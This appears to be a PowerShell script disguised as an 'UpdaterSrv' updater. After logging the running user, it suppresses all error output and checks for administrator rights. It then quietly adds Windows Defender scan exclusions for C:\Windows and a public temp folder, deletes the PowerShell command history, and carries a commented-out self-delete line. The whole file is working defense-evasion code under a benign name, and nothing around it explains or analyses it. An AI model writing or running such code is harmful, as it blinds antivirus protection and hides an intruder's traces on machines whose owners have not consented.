# Define a log file path accessible by most users (including LocalSystem)
$logPath = "C:\Windows\Temp\updater_log.txt"

try {
    # Get the current user running the script
    $currentUser = whoami

    # Create a log message with date and user info
    $logMessage = "UpdaterSrv script executed at $(Get-Date) by user $currentUser"

    # Append the log message to the log file
    $logMessage | Out-File -FilePath $logPath -Append -Encoding utf8
}
catch {
    # If writing to log fails, capture error details
    $errorMessage = "Failed to write log at $(Get-Date). Error: $_"
    $errorMessage | Out-File -FilePath $logPath -Append -Encoding utf8
}

$ErrorActionPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'
$DebugPreference = 'SilentlyContinue'

# Check for admin silently
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) { exit 1 }

# Folders to exclude (modify this list)
$exclusionFolders = @(
    "C:\Windows",
    "C:\Users\Public\Temp"
)

# Get current exclusions without output
$currentExclusions = (Get-MpPreference).ExclusionPath

# Add new exclusions quietly
foreach ($folder in $exclusionFolders) {
    if ($currentExclusions -notcontains $folder) {
        Add-MpPreference -ExclusionPath $folder | Out-Null
    }
}

# Clear command history
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
Clear-History

# Optional: Self-delete the script
# Remove-Item $MyInvocation.MyCommand.Path -Force
